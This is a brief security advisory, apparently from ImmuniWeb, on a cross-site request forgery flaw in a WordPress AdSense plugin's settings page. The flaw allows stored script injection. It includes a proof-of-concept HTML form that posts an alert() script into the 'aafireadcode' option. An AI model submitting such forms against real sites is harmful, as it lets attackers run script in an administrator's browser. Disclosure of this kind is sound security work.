Advisory Details:




The vulnerability exists due to insufficient verification of the HTTP request origin in "/wp-admin/options-general.php" script. A remote attacker can trick a logged-in administrator to visit a specially crafted page with CSRF exploit, inject and execute arbitrary HTML and script code in administratorâ€™s browser in context of vulnerable website. 

The exploitation example below injects JavaScript code, which uses the "alert()" function to display "immuniweb" word:


<form action="http://[host]/wp-admin/options-general.php?page=askapache-firefox-adsense.php" method="post" name="main">
<input type="hidden" name="aafireadcode"  value=&#039;<script>alert("immuniweb");</script>&#039;>
<input type="submit" id="btn">
</form>
